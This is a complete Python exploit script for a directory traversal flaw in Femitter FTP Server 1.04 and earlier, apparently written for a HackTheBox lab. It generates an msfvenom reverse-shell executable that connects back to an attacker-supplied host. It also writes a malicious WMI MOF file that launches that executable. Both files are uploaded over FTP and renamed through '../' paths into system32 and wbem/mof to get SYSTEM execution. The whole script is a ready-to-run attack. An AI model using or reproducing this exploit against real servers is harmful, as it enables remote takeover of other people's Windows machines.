#!/usr/bin/python

#This script is designed to take advantage of a directory transversal vulnerability in Femitter FTP Server <= 1.04;
#Tested on XP Professional x86;
#You will need to set up a listener to catch the reverse shell;
#You might also need to manually hardcode the ftp.cwd() command that is commented out below to a writable directory if Femitter is not in default configuration;
#Inspired by Ippsec's DropZone walkthrough & HackTheBox.eu

#1. creates an MSF payload;
#2. creates a MOF payload;
#3. uploads both payloads to writable dir;
#4. renames them to place them in system32 and system32/wbem/mof/ respectively;

import os
import sys
from ftplib import FTP

if len(sys.argv) != 3:
    print("Usage: femitter.py lhost lport\nExample: femitter.py 10.10.10.10 443")
    exit()
else:
    lhost = sys.argv[1]
    lport = sys.argv[2]

command = "msfvenom -p windows/shell_reverse_tcp lhost=" + lhost + " lport=" + lport + " -f exe --platform windows -a x86 -o zzzzz.exe >/dev/null 2>&1"


print('[+] creating msfvenom payload...' + '\r') 
os.system(command)

#creating our hardcoded MOF payload, thanks to ippsec
print('[+] creating MOF payload...' + '\r')
mof_file = open("exploit.MOF", "w")
mof_file.write("""#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
class MyClass54266
{
  	[key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
 	[key] string Name;
  	[not_null] string ScriptingEngine;
  	string ScriptFileName;
  	[template] string ScriptText;
  uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
    Name  = "ActiveScriptEventConsumer";
    CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
    PerUserInitialization = TRUE;
};

instance of __EventConsumerProviderRegistration
{
  Provider = $P;
  ConsumerClassNames = {"ActiveScriptEventConsumer"};
};

Instance of ActiveScriptEventConsumer as $cons
{
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"zzzzz.exe\\");} catch (err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClass54266\\");} catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try {sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";

};

instance of __EventFilter as $Filt
{
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\"MyClass54266\\"";
  QueryLanguage = "WQL";
};

instance of __FilterToConsumerBinding as $bind
{
  Consumer = $cons;
  Filter = $Filt;
};

instance of MyClass54266 as $MyClass
{
  Name = "ClassConsumer";
};

""")
mof_file.close()

victimIP = str(raw_input("[!] enter the victim IP: "))
username = str(raw_input("[!] enter Femitter FTP username: "))
password = str(raw_input("[!] enter Femitter FTP password: "))

#login to ftp server, change directories, upload our msfvenom payload, upload our .MOF payload, catch reverse-shell
print('[+] authenticating to Femitter server...')
try:
	ftp = FTP(victimIP)
	ftp.login(username,password)
except:
	print('[-] unable to connect to server')
try:	
	print('[+] uploading payloads...')
	ftp.cwd('Upload')
	#ftp.cwd('writable filepath') <--Change this if femitter is not in default config!! 
	ftp.storbinary('STOR zzzzz.exe', open('zzzzz.exe', 'rb'))
	ftp.storbinary('STOR exploit.MOF', open('exploit.MOF', 'rb'))
except:
	print('[-] unable to upload payloads, non-default configuration?')
try:	
	print('[+] executing payloads...')
	ftp.rename('zzzzz.exe', '../../../../../../windows/system32/zzzzz.exe')
	ftp.rename('exploit.MOF', '../../../../../../windows/system32/wbem/mof/exploit.MOF')
	ftp.quit()
	print('[+] enjoy that shell ;)')
except:
	print('[-] unable to execute payloads')